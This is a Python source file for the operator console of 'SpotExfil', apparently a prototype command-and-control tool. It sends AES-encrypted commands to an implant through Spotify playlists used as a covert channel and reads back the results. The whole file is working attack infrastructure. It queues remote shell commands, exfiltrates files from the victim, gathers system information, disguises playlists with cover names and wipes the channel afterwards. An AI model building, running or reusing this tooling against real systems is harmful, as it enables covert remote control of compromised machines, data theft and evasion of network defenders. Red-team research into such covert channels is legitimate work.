"""operator.py - C2 operator console for commanding the implant.

Interactive REPL for sending encrypted commands via Spotify playlists
and retrieving encrypted results.

Usage:
    python -m spotexfil.operator -k <encryption_key>

Commands:
    shell <cmd>     Execute a shell command on the implant
    exfil <path>    Exfiltrate a file from the implant
    sysinfo         Gather system information from the implant
    results         Poll for pending results (single pass)
    wait <seq>      Wait for a specific result by sequence number
    clean           Remove all C2 playlists (both channels)
    status          Show pending commands and processed sequences
    help            Show available commands
    quit / exit     Exit the operator console
"""

import argparse
import json
import time
from pathlib import Path

from . import protocol as proto
from . import transport as spot

__author__ = '@sourcefrenchy'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'

# Load constants from shared protocol spec
_PROTO_PATH = Path(__file__).resolve().parent.parent.parent / 'shared' / 'protocol.json'
with open(_PROTO_PATH) as _f:
    _PROTO = json.load(_f)

# Default timeout for waiting on a specific result
WAIT_TIMEOUT = _PROTO['c2']['wait_timeout']
WAIT_POLL_INTERVAL = _PROTO['c2']['wait_poll_interval']


class Operator:
    """C2 operator: sends commands, retrieves results."""

    def __init__(self, spotify: spot.Spot, encryption_key: str):
        """Initialize the operator.

        Args:
            spotify: Authenticated Spot instance.
            encryption_key: Shared AES-256-GCM passphrase.
        """
        self.spotify = spotify
        self.key = encryption_key
        self.next_seq = 1
        self.pending_seqs = {}  # seq -> module name

    def send_command(self, module: str, args: dict = None) -> int:
        """Queue a command for the implant.

        Args:
            module: Module name (shell, exfil, sysinfo).
            args: Module-specific arguments.

        Returns:
            Sequence number assigned to this command.
        """
        seq = self.next_seq
        self.next_seq += 1

        msg = proto.C2Message(module=module, seq=seq, args=args or {})
        encoded = proto.encode_message(msg.to_command_dict(), self.key)
        chunks = proto.chunk_payload(
            encoded, seq, proto.CHANNEL_CMD, self.key
        )
        self.spotify.write_c2_playlists(chunks)
        self.pending_seqs[seq] = module
        print(f"[*] Command queued: seq={seq} module={module}")
        return seq

    def poll_result_once(self) -> dict:
        """Single poll pass for results.

        Returns:
            Dict mapping seq -> decoded result dict.
        """
        seq_groups = self.spotify.read_c2_playlists(
            channel=proto.CHANNEL_RES,
            encryption_key=self.key,
        )
        results = {}
        for seq_num, chunk_metas in seq_groups.items():
            try:
                payload = proto.reassemble_payload(chunk_metas)
                result = proto.decode_message(payload, self.key)
                results[seq_num] = result
                self.spotify.clean_c2_playlists(
                    proto.CHANNEL_RES, self.key, seq=seq_num
                )
                self.pending_seqs.pop(seq_num, None)
            except Exception as err:
                err_str = str(err).lower()
                if 'tag' in err_str or 'decrypt' in err_str or 'invalid' in err_str:
                    print(f"[!] Failed to decode result seq={seq_num}: "
                          f"encryption key mismatch with implant?")
                else:
                    print(f"[!] Failed to decode result seq={seq_num}: {err}")
        return results

    def wait_for_result(self, seq: int,
                        timeout: int = WAIT_TIMEOUT) -> dict:
        """Block until a specific result arrives or timeout.

        Args:
            seq: Sequence number to wait for.
            timeout: Maximum wait time in seconds.

        Returns:
            Result dict, or None if timed out.
        """
        start = time.time()
        while time.time() - start < timeout:
            results = self.poll_result_once()
            if seq in results:
                return results[seq]
            remaining = int(timeout - (time.time() - start))
            print(f"[*] Waiting for seq={seq}... "
                  f"({remaining}s remaining)")
            time.sleep(WAIT_POLL_INTERVAL)
        print(f"[!] Timeout waiting for seq={seq}")
        return None

    def clean_all(self):
        """Remove all C2 playlists from both channels."""
        self.spotify.clean_c2_playlists(
            proto.CHANNEL_CMD, self.key
        )
        self.spotify.clean_c2_playlists(
            proto.CHANNEL_RES, self.key
        )
        print("[*] All C2 playlists cleaned")

    def interactive(self):
        """Run the interactive operator console."""
        print("SpotExfil C2 Operator Console")
        print("Type 'help' for available commands.\n")

        while True:
            try:
                line = input("c2> ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting")
                break

            if not line:
                continue

            parts = line.split(None, 1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""

            if cmd in ('quit', 'exit'):
                print("[*] Exiting")
                break
            elif cmd == 'help':
                self._print_help()
            elif cmd == 'shell':
                if not arg:
                    print("[!] Usage: shell <command>")
                    continue
                self.send_command("shell", {"cmd": arg})
            elif cmd == 'exfil':
                if not arg:
                    print("[!] Usage: exfil <path>")
                    continue
                self.send_command("exfil", {"path": arg})
            elif cmd == 'sysinfo':
                self.send_command("sysinfo")
            elif cmd == 'results':
                results = self.poll_result_once()
                if results:
                    for seq_num, result in sorted(results.items()):
                        self._display_result(seq_num, result)
                else:
                    print("[*] No results available")
            elif cmd == 'wait':
                if not arg:
                    print("[!] Usage: wait <seq>")
                    continue
                try:
                    seq_num = int(arg)
                except ValueError:
                    print("[!] seq must be a number")
                    continue
                result = self.wait_for_result(seq_num)
                if result:
                    self._display_result(seq_num, result)
            elif cmd == 'clean':
                self.clean_all()
            elif cmd == 'status':
                self._print_status()
            else:
                print(f"[!] Unknown command: {cmd}. Type 'help'.")

    def _display_result(self, seq: int, result: dict):
        """Pretty-print a result."""
        module = result.get('module', '?')
        status = result.get('status', '?')
        data = result.get('data', '')
        print(f"\n--- Result seq={seq} [{module}] "
              f"status={status} ---")
        if module == 'sysinfo' and status == 'ok':
            try:
                info = json.loads(data)
                for k, v in info.items():
                    print(f"  {k}: {v}")
            except json.JSONDecodeError:
                print(data)
        else:
            print(data)
        print("---")

    def _print_status(self):
        """Show pending commands."""
        if self.pending_seqs:
            print("[*] Pending commands:")
            for seq_num, module in sorted(self.pending_seqs.items()):
                print(f"  seq={seq_num} module={module}")
        else:
            print("[*] No pending commands")
        print(f"[*] Next seq: {self.next_seq}")

    @staticmethod
    def _print_help():
        """Print help message."""
        print("""
Available commands:
  shell <cmd>     Execute a shell command on the implant
  exfil <path>    Exfiltrate a file from the implant
  sysinfo         Gather system info from the implant
  results         Poll for pending results (single pass)
  wait <seq>      Wait for a specific result (blocking)
  clean           Remove all C2 playlists
  status          Show pending commands
  help            Show this help
  quit / exit     Exit the console
""")


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description='SpotExfil C2 Operator Console'
    )
    parser.add_argument(
        '-k', '--key', required=True,
        help='Encryption passphrase (must match implant)'
    )
    return parser.parse_args()


def main():
    """Main entry point."""
    args = parse_args()
    spotify = spot.Spot(use_cover_names=True)
    operator = Operator(spotify, args.key)
    operator.interactive()


if __name__ == "__main__":
    main()
